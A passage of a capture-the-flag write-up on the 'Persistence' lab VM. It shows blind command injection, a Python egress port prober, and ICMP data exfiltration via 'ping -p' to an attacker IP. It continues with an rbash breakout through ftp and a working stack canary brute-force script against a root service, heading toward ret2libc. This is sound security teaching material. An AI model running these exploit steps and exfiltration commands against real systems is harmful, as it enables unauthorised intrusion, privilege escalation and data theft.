root@kali:~# tcpdump icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), capture size 65535 bytes
08:15:53.557994 IP 192.168.56.104 > 192.168.56.102: ICMP echo request, id 63493, seq 1, length 64
08:15:53.558011 IP 192.168.56.102 > 192.168.56.104: ICMP echo reply, id 63493, seq 1, length 64</p>

<p>```</p>

<p>Checking for something like <code>/bin/sh2</code> responded with 2 pings, as expected. Awesome. I can now enumerate the existence of files. The concept itself is probably pretty useless, however, if I can confirm the existence of something useful, such as <code>/bin/nc</code>, I may end up with greater success of a shell!</p>

<p>I continued to test numerous files on numerous locations on disk. I noticed a few files that would generally be available on most Linux systems were not available according to my checker which was really odd. It actually had me doubt the check too. Nonetheless,  <code>/usr/bin/python</code> appeared to be available! I really like python so this had me really happy.</p>

<h2>blind command injection &ndash; port scanner</h2>

<p>I tested a few commands with <code>python -c</code>, such as sleep etc just to confirm that it is working. I then proceeded to try and get a reverse shell going using it.</p>

<p>No. Luck.</p>

<p>I no longer doubted the fact that I had a working interpreter, however, the question about a egress firewall still remains unanswered. To test this, I decided to code a small, cheap-and-nasty port &lsquo;prober&rsquo; so that I can try and determine which port is open outgoing. The idea was to watch my <code>tcpdump</code> for any tcp traffic comming from this host:</p>

<p>```python probe.py
import socket
for port in xrange(1, 65535):</p>

<pre><code>sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.settimeout(0.1)
sock.connect_ex(("192.168.56.102", port))
sock.close()
</code></pre>

<p>```</p>

<p>Using my blind command injection, I echoed this content to <code>/tmp/probe.py</code> via the input field, and then in a subsequent request, ran it using <code>python /tmp/probe.py</code>. I was relatively certain the script was running as intended as it took the expected amount of time (similar to when I was testing locally) to complete the HTTP request. According to my prober (and assuming it actually worked), there were 0 tcp ports open&hellip;</p>

<h2>data exfiltration</h2>

<p>With no tcp out, I had to once again rethink what I have up to now. The only output I have atm is a true/false scenario. Hardly sufficient to do anything useful. I found the <code>debug.php</code> file on disk and tried to echo a PHP web shell to the same directory. This also failed.</p>

<p>So, only ping eh. I recall something about ping tunnels/ping shells/ping something. So, I googled some of these solutions. There were a number of things I could try, however, I was wondering how the actual data transport was happening for these things.</p>

<p>Eventually, I came across the <code>-p</code> argument for ping after reading <a href="http://blog.commandlinekungfu.com/2012/01/episode-164-exfiltration-nation.html">this</a> blogpost. From <code>man 8 ping</code> we read:</p>

<p><code>bash ping patterns
-p pattern
   You may specify up to 16 ``pad'' bytes to fill out the packet you send.
   This is useful for diagnosing data-dependent problems in a network.
   For example, ``-p ff'' will cause the sent packet to be filled with all ones.
</code></p>

<p>So that changes things. I quickly confirmed that we have <code>xxd</code> available using my previous enumeration method and we did. Great.</p>

<p>I fired up tcpdump with the <code>-X</code> flag to show me the packet contents, and tested it out with the following payload for the <code>id</code> command:</p>

<p><code>bash Ping pattern `id` command
;id| xxd -p -c 16 | while read line; do ping -p $line -c 1 -q 192.168.56.102; done
</code></p>

<p>On the <code>tcpdump</code> side of things&hellip;</p>

<p>```bash Ping pattern tcpdump
root@kali:~/Desktop# tcpdump icmp -X
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), capture size 65535 bytes
09:18:14.439222 IP 192.168.56.104 > 192.168.56.102: ICMP echo request, id 6920, seq 1, length 64</p>

<pre><code>0x0000:  4500 0054 0000 4000 4001 488a c0a8 3868  E..T..@.@.H...8h
0x0010:  c0a8 3866 0800 4b5b 1b08 0001 56a3 1a54  ..8f..K[....V..T
0x0020:  f357 0a00 6e67 696e 7829 2067 7569 643d  .W..nginx).guid=
0x0030:  3439 3828 6e67 696e 7829 2067 7569 643d  498(nginx).guid=
0x0040:  3439 3828 6e67 696e 7829 2067 7569 643d  498(nginx).guid=
0x0050:  3439 3828                                498(
</code></pre>

<p>09:18:14.439248 IP 192.168.56.102 > 192.168.56.104: ICMP echo reply, id 6920, seq 1, length 64</p>

<pre><code>0x0000:  4500 0054 a049 0000 4001 e840 c0a8 3866  E..T.I..@..@..8f
0x0010:  c0a8 3868 0000 535b 1b08 0001 56a3 1a54  ..8h..S[....V..T
0x0020:  f357 0a00 6e67 696e 7829 2067 7569 643d  .W..nginx).guid=
0x0030:  3439 3828 6e67 696e 7829 2067 7569 643d  498(nginx).guid=
0x0040:  3439 3828 6e67 696e 7829 2067 7569 643d  498(nginx).guid=
0x0050:  3439 3828                                498(
</code></pre>

<p>09:18:14.440365 IP 192.168.56.104 > 192.168.56.102: ICMP echo request, id 7176, seq 1, length 64</p>

<pre><code>0x0000:  4500 0054 0000 4000 4001 488a c0a8 3868  E..T..@.@.H...8h
0x0010:  c0a8 3866 0800 318a 1c08 0001 56a3 1a54  ..8f..1.....V..T
0x0020:  e35a 0a00 6769 6e78 2920 6772 6964 3d34  .Z..ginx).grid=4
0x0030:  3938 286e 6769 6e78 2920 6772 6964 3d34  98(nginx).grid=4
0x0040:  3938 286e 6769 6e78 2920 6772 6964 3d34  98(nginx).grid=4
0x0050:  3938 286e                                98(n
</code></pre>

<p>09:18:14.440382 IP 192.168.56.102 > 192.168.56.104: ICMP echo reply, id 7176, seq 1, length 64</p>

<pre><code>0x0000:  4500 0054 a04a 0000 4001 e83f c0a8 3866  E..T.J..@..?..8f
0x0010:  c0a8 3868 0000 398a 1c08 0001 56a3 1a54  ..8h..9.....V..T
0x0020:  e35a 0a00 6769 6e78 2920 6772 6964 3d34  .Z..ginx).grid=4
0x0030:  3938 286e 6769 6e78 2920 6772 6964 3d34  98(nginx).grid=4
0x0040:  3938 286e 6769 6e78 2920 6772 6964 3d34  98(nginx).grid=4
0x0050:  3938 286e                                98(n
</code></pre>

<p>09:18:14.441191 IP 192.168.56.104 > 192.168.56.102: ICMP echo request, id 7432, seq 1, length 64</p>

<pre><code>0x0000:  4500 0054 0000 4000 4001 488a c0a8 3868  E..T..@.@.H...8h
0x0010:  c0a8 3866 0800 ed92 1d08 0001 56a3 1a54  ..8f........V..T
0x0020:  f95d 0a00 286e 6769 6e78 290a 6f75 7073  .]..(nginx).oups
0x0030:  3d34 3938 286e 6769 6e78 290a 6f75 7073  =498(nginx).oups
0x0040:  3d34 3938 286e 6769 6e78 290a 6f75 7073  =498(nginx).oups
0x0050:  3d34 3938                                =498
</code></pre>

<p>09:18:14.441198 IP 192.168.56.102 > 192.168.56.104: ICMP echo reply, id 7432, seq 1, length 64</p>

<pre><code>0x0000:  4500 0054 a04b 0000 4001 e83e c0a8 3866  E..T.K..@..&gt;..8f
0x0010:  c0a8 3868 0000 f592 1d08 0001 56a3 1a54  ..8h........V..T
0x0020:  f95d 0a00 286e 6769 6e78 290a 6f75 7073  .]..(nginx).oups
0x0030:  3d34 3938 286e 6769 6e78 290a 6f75 7073  =498(nginx).oups
0x0040:  3d34 3938 286e 6769 6e78 290a 6f75 7073  =498(nginx).oups
0x0050:  3d34 3938                                =498
</code></pre>

<p>```</p>

<p>Mind. Blown.</p>

<p>In case you don&rsquo;t see it, we have extracts of the <code>id</code> command in the request/response packets like <em>98(nginx).grid=4</em>. While this is not really fun to decipher, and with commands that produce a lot of output even worse, it was in fact <strong>something</strong> to work with!</p>

<p>I fiddled around with this for a little while longer, trying to make the output a little more readable. Eventually I fired up scapy and just printed the data section of the packet. Not much better, but with a little more effort I am sure you can get something very workable out of it.</p>

<p>```python Scapy sniff()</p>

<blockquote><blockquote><blockquote><p>sniff(filter=&ldquo;icmp[icmptype] == 8 and host 192.168.56.104&rdquo;, prn=lambda x: x.load)
ؤT�nginx) guid=498(nginx) guid=498(nginx) guid=498(
ؤT
   ginx) grid=498(nginx) grid=498(nginx) grid=498(n
ؤT�(nginx)
oups=498(nginx)
oups=498(nginx)
oups=498
```</p></blockquote></blockquote></blockquote>

<h2>sysadmin-tool</h2>

<p>So with actual output to work with, I can almost say I have shell, however, it&rsquo;s crap. Here I had many options to go for. Do I try and get one of those ping tunnels up to shell with? Or something else.</p>

<p>At one stage I ran <code>ls</code> as the command trying to see if there was anything in the web path that I may not have found yet. A file called <em>sysadmin-tool</em> was revealed. I browsed to the file which pushed it as a download for me, and saved it locally. I then ran the bin through <code>strings</code>:</p>

<p><code>bash sysadmin-tool strings
root@kali:~# strings sysadmin-tool
/lib/ld-linux.so.2
__gmon_start__
libc.so.6
_IO_stdin_used
chroot
strncmp
puts
setreuid
mkdir
rmdir
chdir
system
__libc_start_main
GLIBC_2.0
PTRh
[^_]
Usage: sysadmin-tool --activate-service
--activate-service
breakout
/bin/sed -i 's/^#//' /etc/sysconfig/iptables
/sbin/iptables-restore &lt; /etc/sysconfig/iptables
Service started...
Use avida:dollars to access.
/nginx/usr/share/nginx/html/breakout
</code></p>

<p>From this alone we can deduce that when run, it may modify the firewall. It also looks like it contains some credentials, so I took note of those too. I then tried to run the command, followed by a nmap scan:</p>

<p><code>bash Ping pattern `id` command
;./sysadmin-tool --activate-service| xxd -p -c 16 | while read line; do ping -p $line -c 1 -q 192.168.56.102; done
</code></p>

<p>```bash second nmap of Persistence
root@kali:~# nmap 192.168.56.104 &mdash;reason -sV -p-</p>

<p>Starting Nmap 6.46 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-09-18 09:46 SAST
Nmap scan report for 192.168.56.104
Host is up, received reset (0.0017s latency).
Not shown: 65533 filtered ports
Reason: 65533 no-responses
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 5.3 (protocol 2.0)
80/tcp open  http    syn-ack nginx 1.4.7</p>

<p>Service detection performed. Please report any incorrect results at <a href="http://nmap.org/submit/">http://nmap.org/submit/</a> .
Nmap done: 1 IP address (1 host up) scanned in 6637.05 seconds
```</p>

<p>Yay! SSH.</p>

<h2>shell and breakout as avida</h2>

<p>Using the information that looked like credentials retrieved in the previous section, I proceeded to SSH into the server:</p>

<p><code>bash avida rbash
root@kali:~/Desktop/persistence# ssh avida@192.168.56.104
The authenticity of host '192.168.56.104 (192.168.56.104)' can't be established.
RSA key fingerprint is 37:22:da:ba:ef:05:1f:77:6a:30:6f:61:56:7b:47:54.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.168.56.104' (RSA) to the list of known hosts.
avida@192.168.56.104's password:    # dollars
Last login: Thu Sep 18 05:57:30 2014
-rbash-4.1$
</code></p>

<p>Op success. Or is it? I immediately noticed the prompt as <code>rbash</code>, aka restricted bash. :( Having a look around, I was in fact very limited to what I can do. Most annoyingly, I was unable to run commands with a <code>/</code> in them.</p>

<p><code>bash rbash restrictions
-rbash-4.1$ /bin/bash
-rbash: /bin/bash: restricted: cannot specify `/' in command names
</code></p>

<p>So the next logical step was to attempt &lsquo;breaking out&rsquo; of this shell so that I can have a better look around. I was able to cat say <code>/etc/passwd</code>, but that only gets you <em>that</em> far :P</p>

<p>After quite some time and some research, it became apparent that the well known breakouts from rbash are not possible.  I was unable to edit my PATH, change files and re-login or use the classic <code>vi</code> <code>:shell</code> breakout. Eventually (and out of desperation), I focussed my attention to <code>ftp</code>. Opening <code>ftp</code>, and typing <code>help</code> at the prompt, I studied each available command carefully. In the list was a exclamation mark(!), which I typed and pressed enter:</p>

<p><code>bash bash via ftp o_0
-rbash-4.1$ ftp
ftp&gt; !
+rbash-4.1$ /bin/bash
bash-4.1$
</code></p>

<p>I got dropped into another <code>rbash</code> shell, however this time with a +. So, I went for <code>/bin/bash</code> and&hellip; w00t? I exported a new PATH to my environment, and all of those annoying rbash restrictions were gone. Thank goodness!</p>

<h2>the wopr game</h2>

<p>During the enumeration done while still stuck with <code>rbash</code>, I noticed that the machine was listening for connections on tcp/3333 locally when inspecting the output of <code>netstat</code>. Opening a telnet session to this port presented you with a &lsquo;game&rsquo;:</p>

<p>```bash wopr
bash-4.1$ telnet 127.0.0.1 3333
Trying 127.0.0.1&hellip;
Connected to 127.0.0.1.
Escape character is &lsquo;^]&rsquo;.
[+] hello, my name is sploitable
[+] would you like to play a game?</p>

<blockquote><p>yes!
[+] yeah, I don&rsquo;t think so
[+] bye!
Connection closed by foreign host.
bash-4.1$
```</p></blockquote>

<p>I asked really, really nicely, but no matter how polite I was, it would just not let me play!</p>

<p>Further inspection showed that the game was possibly run as root from <code>/usr/local/bin/wopr</code></p>

<p>```bash wopr as root
bash-4.1$ ps -ef | grep wopr
root      1005     1  0 05:42 ?        00:00:00 /usr/local/bin/wopr
root      1577  1005  0 06:43 ?        00:00:00 [wopr] <defunct>
avida     1609  1501  0 06:47 pts/0    00:00:00 grep wopr</p>

<p>bash-4.1$ ls -lah /usr/local/bin/wopr
-rwxr-xr-x. 1 root root 7.7K Apr 28 07:43 /usr/local/bin/wopr
```</p>

<p><code>wopr</code> was also readable to me which was great news! I decided to get a copy of the binary onto my local Kali Linux box, and take a closer look at the internals:</p>

<p>```bash wopr xxd xfer</p>

<h1>first, hex encode the file</h1>

<p>bash-4.1$ xxd -p -c 36 /usr/local/bin/wopr
7f454c460101010000000000000000000200030001000000c08604083400000080110000
0000000034002000090028001e001b000600000034000000348004083480040820010000
[&hellip; snip &hellip;]
38362e6765745f70635f7468756e6b2e6278006d61696e005f696e697400
bash-4.1$</p>

<h1>next, I copied the xxd output from the persistence terminal</h1>

<h1>and pasted it into a file called wopr.xxd. Then reverted it</h1>

<h1>and redirected the output to <code>wopr</code></h1>

<p>root@kali:~# cat wopr.xxd | xxd -r -p > wopr
```</p>

<p>The idea was to see if there may be a way to exploit this program so that I can execute some commands using it. It is running as root after all&hellip;</p>

<h2>wopr, stack smashing</h2>

<p>Poking around the binary, I mostly used <code>gdb</code> along with <a href="https://github.com/longld/peda">peda</a>.
Checksec revealed that this binary was compiled with quite a few security features built in.</p>

<p><code>bash wopr binary sec
root@kali:~# gdb -q ./wopr
Reading symbols from persistence/wopr...(no debugging symbols found)...done.
gdb-peda$ checksec
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
</code></p>

<p>Digesting the above output should bring us to a few conclusions. A stack canary is present, meaning if we corrupt memory, and dont have a correct canary, the binary may terminate itself as a protection mechanism once it detects the incorrect canary. Secondly, the binary is compiled to mark the stack as non executable. Any potential shellcode that we write here will not be executed. Lastly, the GOT relocation is set to read only, meaning function locations are resolved at the beginning of execution and the GOT is then marked as read only resulting in the inability to rewrite plt type lookups.</p>

<p>With all of that in mind, I ran the binary with the <code>r</code> command, and made a new telnet session to it.</p>

<p><code>bash wopr run
gdb-peda$ r
[+] bind complete
[+] waiting for connections
[+] logging queries to $TMPLOG
[+] got a connection
[New process 26936]
[Inferior 2 (process 26936) exited normally]
Warning: not running or target is remote
gdb-peda$
</code></p>

<p>When the new connection came in, a notice of a new process appears. Disassembling the main function gives us an indication that the process is doing a <code>fork()</code></p>

<p>```bash wopr fork()
gdb-peda$ disass main
Dump of assembler code for function main:</p>

<pre><code>[.. snip ..]
</code></pre>

<p>   0x080489fd &lt;+543>:   mov    DWORD PTR [esp],0x8048cb2
   0x08048a04 &lt;+550>:   call   0x804866c &lt;puts@plt>
   0x08048a09 &lt;+555>:   call   0x804867c &lt;fork@plt> # &lt;&mdash;
   0x08048a0e &lt;+560>:   test   eax,eax
   0x08048a10 &lt;+562>:   jne    0x8048b0e &lt;main+816>
   0x08048a16 &lt;+568>:   mov    DWORD PTR [esp+0x8],0x21
   0x08048a1e &lt;+576>:   mov    DWORD PTR [esp+0x4],0x8048cc8
   0x08048a26 &lt;+584>:   mov    eax,DWORD PTR [ebp-0x22c]
   0x08048a2c &lt;+590>:   mov    DWORD PTR [esp],eax
   0x08048a2f &lt;+593>:   call   0x804858c &lt;write@plt></p>

<pre><code>[.. snip ..]
</code></pre>

<p>End of assembler dump.
gdb-peda$
```</p>

<p>Why is the <code>fork()</code> so important!? We will see in a bit just hang on. :)</p>

<p>So back to fuzzing wopr, I proceeded to send some arbtritary input via the telnet session. I noticed once I had sent more than 30 characters as input, wopr would freak out! This is a good freak out btw :D</p>

<p>Sending 30 x A&rsquo;s results in:
<code>bash wopr stopper
gdb-peda$ [+] got a connection
*** stack smashing detected ***: wopr terminated
======= Backtrace: =========
/lib/i386-linux-gnu/libc.so.6(__fortify_fail+0x40)[0xb7f5ebb0]
/lib/i386-linux-gnu/libc.so.6(+0xeab6a)[0xb7f5eb6a]
wopr[0x80487dc]
wopr[0x8048ad6]
/lib/i386-linux-gnu/libc.so.6(__libc_start_main+0xe6)[0xb7e8ae36]
wopr[0x80486e1]
======= Memory map: ========
08048000-08049000 r-xp 00000000 08:01 1184792    wopr
08049000-0804a000 r--p 00000000 08:01 1184792    wopr
0804a000-0804b000 rw-p 00001000 08:01 1184792    wopr
0804b000-0806c000 rw-p 00000000 00:00 0          [heap]
b7e3b000-b7e57000 r-xp 00000000 08:01 1573598    /lib/i386-linux-gnu/libgcc_s.so.1
b7e57000-b7e58000 rw-p 0001b000 08:01 1573598    /lib/i386-linux-gnu/libgcc_s.so.1
b7e73000-b7e74000 rw-p 00000000 00:00 0
b7e74000-b7fbd000 r-xp 00000000 08:01 1580474    /lib/i386-linux-gnu/libc-2.13.so
b7fbd000-b7fbe000 ---p 00149000 08:01 1580474    /lib/i386-linux-gnu/libc-2.13.so
b7fbe000-b7fc0000 r--p 00149000 08:01 1580474    /lib/i386-linux-gnu/libc-2.13.so
b7fc0000-b7fc1000 rw-p 0014b000 08:01 1580474    /lib/i386-linux-gnu/libc-2.13.so
b7fc1000-b7fc4000 rw-p 00000000 00:00 0
b7fde000-b7fe1000 rw-p 00000000 00:00 0
b7fe1000-b7fe2000 r-xp 00000000 00:00 0          [vdso]
b7fe2000-b7ffe000 r-xp 00000000 08:01 1579852    /lib/i386-linux-gnu/ld-2.13.so
b7ffe000-b7fff000 r--p 0001b000 08:01 1579852    /lib/i386-linux-gnu/ld-2.13.so
b7fff000-b8000000 rw-p 0001c000 08:01 1579852    /lib/i386-linux-gnu/ld-2.13.so
bffdf000-c0000000 rw-p 00000000 00:00 0          [stack]
</code></p>

<p>So it looks like we may have a <a href="http://en.wikipedia.org/wiki/Stack_buffer_overflow">buffer overflow</a> here. What is important though is the backtrace shows that the last fail was in <code>__fortify_fail</code>. <code>__fortify_fail</code> is normally just a error reporter, as was called because the stack cookie check failed. Remember the CANARY we detected earlier with the <code>checksec</code> output? With that knowledge, is almost safe to assume that byte 30 is where the stack canary starts. This means that if we want to corrupt more memory further up the stack (which is what we want actually), we need to find a way to know what the canary value is.</p>

<p>But lets not stop there. I continued to place more A&rsquo;s into the input until at byte 39 I noticed 41 (hex for A) in the backtrace. By the time I had 42 A&rsquo;s, the backtrace had a full 4 bytes of 41.</p>

<p><code>bash possible EIP
[+] got a connection
*** stack smashing detected ***: wopr terminated
======= Backtrace: =========
/lib/i386-linux-gnu/libc.so.6(__fortify_fail+0x40)[0xb7f5ebb0]
/lib/i386-linux-gnu/libc.so.6(+0xeab6a)[0xb7f5eb6a]
wopr[0x80487dc]
[0x41414141]        #&lt;-- EIP?
</code></p>

<p>Was this where EIP was?</p>

<p>With the debugging we have done thus far, lets assume that the stack layout looks something like this:</p>

<p>```text
&ndash; &ndash;>         &ndash; &ndash;>        [42 Bytes  in Total]        &ndash; &ndash;>         &ndash; ></p>

<p>[        30 Bytes Data         ] [  Cookie  ] [  4 Bytes  ] [  EIP  ]</p>

<ul>
<li>&ndash;>         &ndash; &ndash;>        [42 Bytes  in Total]        &ndash; &ndash;>         &ndash; >
```</li>
</ul>


<h2>wopr &ndash; stack canary bruteforce</h2>

<p>This part of the challenge took me the second longest to nail. I have zero knowledge of stack cookies, let alone experience in bypassing them. So I had to pack out my best Google-fu abilities and learn all I can about bypassing these cookies.</p>

<p>A lot was learnt here. The 3 primary resources that really helped me get the ball rolling into something workable was</p>

<ul>
<li><a href="http://phrack.org/issues/67/13.html">Phrack Issue 67</a></li>
<li><a href="http://fluxius.handgrep.se/2011/10/20/the-art-of-elf-analysises-and-exploitations/">The Art Of ELF: Analysis and Exploitations</a></li>
<li><a href="http://www.pwntester.com/blog/2013/12/31/fusion-level04-write-up/">Fusion level04 write-up</a> (SPOILER ALERTS for another CTF)</li>
</ul>


<p>Now, remember I mentioned <code>fork()</code> earlier on? From the Phrack article, we can read some interesting ideas about binaries that make use of <code>fork()</code> and how this affects stack cookies.</p>

<p>From <code>man 2 fork</code>&rsquo;s description:</p>

<p>```bash fork man
DESCRIPTION</p>

<pre><code> Fork() causes creation of a new process.  The new process (child process) 
 is an exact copy of the calling process (parent process) except for the 
 following:
</code></pre>

<p> [.. snip ..]
```</p>

<p>What this means for us then is that every time we have a new <code>fork()</code> happen, the stack cookie will supposedly remain constant between forks as it comes from the parent. <em>”Soooooooo what?”</em> I hear you say! Well, that means we can attempt to try all of the possible ASCII characters as hex, 4 times (for 4 bytes), to try and brute force this value!</p>

<p>The theory for this was great, but the practice was a different story. In order to perform a successful brute force, at the very minimum, I needed a reliable way to determine a correct and incorrect value. With my local copy of <code>wopr</code>, I can just watch the console output, however, I don&rsquo;t have that luxury on the Persistence VM!</p>

<p>While thinking about this problem, I started to code a little script to start the juices flowing in getting this brute force right. The basic idea was to have a nested xrange(4) &ndash;> xrange(255) concat the values to a variable as they are determined. While tinkering with the script and the TCP socket code, I started to realize that there may actually be a way to remotely determine a failed and successful attempt!</p>

<p>When a string of less than 30 A&rsquo;s is sent, the server will send a &ldquo;[+] bye!&rdquo; message before closing the socket. More than 30 A&rsquo;s, and the socket is killed before the bye</p>

<p>```bash Canary Brute Success Condition
root@kali:~# telnet 127.0.0.1 3333
Trying 127.0.0.1&hellip;
Connected to 127.0.0.1.
Escape character is &lsquo;^]&rsquo;.
[+] hello, my name is sploitable
[+] would you like to play a game?</p>

<blockquote><p>A
[+] yeah, I don&rsquo;t think so
[+] bye!                           # &lt;&mdash; We have a bye!
Connection closed by foreign host.</p></blockquote>

<p>root@kali:~# telnet 127.0.0.1 3333
Trying 127.0.0.1&hellip;
Connected to 127.0.0.1.
Escape character is &lsquo;^]&rsquo;.
[+] hello, my name is sploitable
[+] would you like to play a game?</p>

<blockquote><p>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[+] yeah, I don&rsquo;t think so
Connection closed by foreign host. # &lt;&mdash; No bye!
```</p></blockquote>

<p>This was perfect and exactly what was needed to complete the brute force script! All I had to do was check for the word <em>bye</em> in the last socket receive to know if we have succeeded or not. The resultant script was therefore:</p>

<p>```python canary_brute.py
import socket
import sys</p>

<p>payload = &ldquo;A&rdquo; * 30  # amount of bytes before the first canary bit is hit
canary = &ldquo;&rdquo;         # the canary</p>

<h1>start the canary brute loop. We want to brute 4 bytes &hellip;</h1>

<p>for x in xrange(1,5):</p>

<pre><code># ... and try all possibilities
for canary_byte in xrange(0, 256):

    # prepare the byte
    hex_byte = chr(canary_byte)

    # prepare the payload
    send = payload + canary + hex_byte

    print "[+] Trying: '\\x{0}' in payload '%s' (%d:%d/255)".format(hex_byte.encode("hex")) % (send, x, canary_byte)

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(('127.0.0.1', 3333))

    # get the inital banners
    sock.recv(35)   # [+] hello, my name is sploitable\n
    sock.recv(40)   # [+] would you like to play a game?\n
    sock.recv(5)    # &gt;

    # send the payload  
    sock.send(send)
    sock.recv(27)   # [+] yeah, I don't think so\n

    # if we have a OK response, then we will have this last part
    # as '[+] bye!\n' populated, if its wrong, not
    data =  sock.recv(64)   # [+] bye!\n
    if "bye" in data:
        print "[!!] Found a possible canary value of '{0}'!".format(hex_byte.encode("hex"))
        canary += hex_byte
        sock.close()
        break

    sock.close()

# if we cant even find the first byte, we failed already
if len(canary) &lt;= 0:
    print "[-] Unable to even find the first bit. No luck"
    sys.exit(0)
</code></pre>

<p>if len(canary) > 0:</p>

<pre><code>print "[+] Canary seems to be {0}".format(canary.encode("hex"))
</code></pre>

<p>else:</p>

<pre><code>print "[-] Unable to brute canary"
</code></pre>

<p>```</p>

<p>An example run of this would end as follows:</p>

<p><code>bash Running canary_brute.py
[+] Trying: '\x8d' in payload 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' (4:141/255)
[+] Trying: '\x8e' in payload 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' (4:142/255)
[+] Trying: '\x8f' in payload 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' (4:143/255)
[+] Trying: '\x90' in payload 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' (4:144/255)
[!!] Found a possible canary value of '90'!
[+] Canary seems to be 00ef8d90
</code></p>

<p>Winning. Just to make 100% sure I actually have the correct canary, I made another small socket program just to append the canary to the initial 30 A&rsquo;s and send it. No stack smashing message appeared and we got the <em>bye</em> message :)</p>

<h2>wopr &ndash; NX and EIP</h2>

<p>If you can recall from earlier, <code>wopr</code> was compiled with the NX bit set. Effectively that means we can&rsquo;t simply exploit this vulnerability by setting EIP to the beginning of shellcode we simply sent along with the payload as the stack is not executable. Thankfully though, there is a concept such as ret2libc.</p>

<p>The idea behind ret2libc is to steer the application flow to useful commands within libc itself, and get code execution that way. A very popular function to use is the <code>system()</code> command, for almost obvious reasons.</p>

<p>I decided to make use of the same method. I quickly checked to see if ASLR was enabled on the Persistence VM:</p>

<p>```bash ASLR check
bash-4.1$ ldd /usr/local/bin/wopr</p>

<pre><code>linux-gate.so.1 =&gt;  (0xb7fff000)
libc.so.6 =&gt; /lib/libc.so.6 (0xb7e62000)
/lib/ld-linux.so.2 (0x00110000)
</code></pre>

<p>bash-4.1$ ldd /usr/local/bin/wopr</p>

<pre><code>linux-gate.so.1 =&gt;  (0xb7fff000)
libc.so.6 =&gt; /lib/libc.so.6 (0xb7e62000)
/lib/ld-linux.so.2 (0x00110000)
</code></pre>

<p>```</p>

<p>The addresses for the linked files remained static between all of the lookups, indicating that ASLR was not enabled. This makes things slightly easier. Because this is a 32bit OS though, even if it was enabled it would not have been too much of a issue :)</p>

<p>The next step was to find out where system() lived in libc. This is also a very easy step to perform. A interesting note here. GDB was using the SHELL env variable for commands, and because I have come from rbash, it was still set to that. A simple <code>export SHELL=/bin/bash</code> fixed it though. Also, just to be clear, I am now doing this address lookup on the Persistence VM, however I had to do exactly the same thing on the Kali VM where I was building my exploit.</p>

<p>```bash finding system()
bash-4.1$ export SHELL=/bin/bash</p>

<p>bash-4.1$ gdb -q /usr/bin/telnet
Reading symbols from /usr/bin/telnet&hellip;(no debugging symbols found)&hellip;done.
Missing separate debuginfos, use: debuginfo-install telnet-0.17-47.el6_3.1.i686
(gdb) b *main   # set a breakpoint to stop the flow once we hit the main() func
Breakpoint 1 at 0x7b90</p>

<p>(gdb) r         # run the program
Starting program: /usr/bin/telnet
Breakpoint 1, 0x00117b90 in main ()</p>

<p>(gdb) p system  # We hit our breakpoint, lets leak the address for system()
$1 = {<text variable, no debug info>} 0xb7e56210 <system>
(gdb)
```</p>

<p>We find <code>system()</code> at <code>0xb7e56210</code>. I used the telnet binary simply because it is also linked to libc.</p>

<p>So to sum up what we have so far, lets take another look at what the stack will look like now when sending our exploit payload:</p>

<p>```text Stack after memory corruption up to EIP
&ndash; &ndash;>         &ndash; &ndash;>        [42 Bytes  in Total]        &ndash; &ndash;>           &ndash; ></p>

<p>[   A x 30   ] [  \xff\xff\xff\xff  ] [  AAAA  ] [  \x10\x62\xe5\xb7  ]
 ^~ Initial BF    ^~ Bruted cookie                    ^~ system()</p>

<ul>
<li>&ndash;>         &ndash; &ndash;>        [42 Bytes  in Total]        &ndash; &ndash;>           &ndash; >
```</li>
</ul>


<p>The address for <code>system()</code> is &lsquo;backwards&rsquo; because we are working with a <a href="http://en.wikipedia.org/wiki/Endianness">little endian</a> system. The 4 * A before the address to <code>system()</code> is simply padding to EIP.</p>

<h2>wopr &ndash; code exec</h2>

<p>This part, by far, took me <strong>the longest</strong> of the entire challenge!</p>

<p>The next step was to get actual code to execute using <code>system()</code>. While this may sound trivial, it has challenges of its own. One of the key things I had to realize whilst getting frustrated with this was &ldquo;to remember, you are trying to make a program do what it is not intended to do, expect difficulty!&rdquo;.</p>

<p>I tried to put a command in a env variable and failed.<br/>
I attempted to write a ROP chain and failed.</p>

<p>These failed mostly due to by own lack of understanding, tiredness and frustration. My attempts generally was to get a script <code>/tmp/runme</code> to run. <code>runme</code> was a bash script that will compile a small C shell, change ownership and set the suid bit. Yes, Persistence had <code>gcc</code> installed :)</p>

<p>&ldquo;fail&rdquo; * 100000 * 100000. That is a rough guestimate of the amount of times I tried this part.</p>

<p>Eventually, I finally came to the realization that I may have to search for other avenues of code execution. In fact, I completely stepped away from the VM and did something else.</p>

<p>Returning later with a fresh look, I run wopr through <code>strings</code> one more time:</p>

<p>```bash wopr strings
root@kali:~/Desktop/persistence# strings  wopr
/lib/ld-linux.so.2
<strong>gmon_start</strong>
libc.so.6
_IO_stdin_used</p>

<p>[.. snip ..]</p>

<p>[^_]
[+] yeah, I don&rsquo;t think so
socket
setsockopt
bind
[+] bind complete
listen
/tmp/log          # &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;
TMPLOG
[+] waiting for connections
[+] logging queries to $TMPLOG
accept
[+] got a connection
[+] hello, my name is sploitable
[+] would you like to play a game?
[+] bye!
```</p>

<p>See that? Can you <strong>see</strong> that&hellip; We have <code>/tmp/log</code> RIGHT THERE!</p>

<p>I confirmed that <code>/tmp/log</code> wasn&rsquo;t actually in use, and moved my original <code>/tmp/runme</code> script there.</p>

<p>The only thing that was left now was to find the location of the string <code>/tmp/log</code> in <code>wopr</code>, push that to the stack, and ride the bus home. So lets do the hard work required to find this valuable piece of the puzzle:</p>

<p>```bash finding /tmp/log
